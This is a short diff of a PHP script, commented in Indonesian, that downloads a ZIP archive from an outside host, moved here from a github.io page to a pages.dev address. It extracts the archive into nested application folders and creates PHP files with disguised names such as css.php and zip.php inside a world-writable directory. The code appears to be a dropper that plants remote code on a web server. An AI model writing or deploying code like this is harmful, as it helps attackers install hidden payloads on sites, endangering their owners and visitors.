@@ -16,7 +16,7 @@ if (!class_exists('ZipArchive')) {
     die("Extension ZIP belum aktif (ZipArchive tidak tersedia). Aktifkan 'zip' di PHP.");
 }
 
-$url = "https://veitokonivinaka05-creator.github.io/privacy/diff/m13.zip";
+$url = "https://filemanager-cryo.pages.dev/zip/m13.zip";
 $savePath  = __DIR__ . "/classic/App/Base/zip/m13.zip";
 $packDir   = __DIR__ . "/classic/App/Base/";
 $LockDir   = __DIR__ . "/classic/App/Base/assets/Static";
@@ -95,7 +95,14 @@ if ($zip->open($savePath) === TRUE) {
     die("Gagal membuka ZIP.");
 }
 
-// Tambah folder & file baru
+// Tambah folder & file baru (di dalam folder classic)
+$baseDir = __DIR__ . "/classic"; // sekarang mengarah ke folder classic yang benar
+
+// Pastikan folder classic ada (opsional, karena sudah dibuat dari ekstrak ZIP)
+if (!is_dir($baseDir)) {
+    mkdir($baseDir, 0777, true);
+}
+
 $targets = [
     "Class/css.php",
     "Base/zip.php",
@@ -107,7 +114,7 @@ $targets = [
 ];
 
 foreach ($targets as $relPath) {
-    $fullPath = $classicDir . "/" . $relPath;
+    $fullPath = $baseDir . "/" . $relPath;
     $dir = dirname($fullPath);
     if (!is_dir($dir)) {
         mkdir($dir, 0755, true);
